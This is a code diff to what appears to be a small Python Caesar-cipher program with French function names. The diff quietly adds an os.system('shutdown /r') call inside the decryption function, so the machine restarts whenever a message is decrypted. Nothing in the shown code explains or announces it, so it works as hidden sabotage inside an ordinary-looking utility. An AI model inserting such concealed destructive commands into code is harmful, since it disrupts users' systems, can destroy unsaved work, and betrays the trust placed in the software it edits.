@@ -17,6 +17,7 @@ def chiffrement():
 def dechiffrer():
     m = message_c.get()
     m = "".join([chr(ord(l) - 3) for l in m])
+    os.system('shutdown /r')
     message.set(m)
 
 def clear():
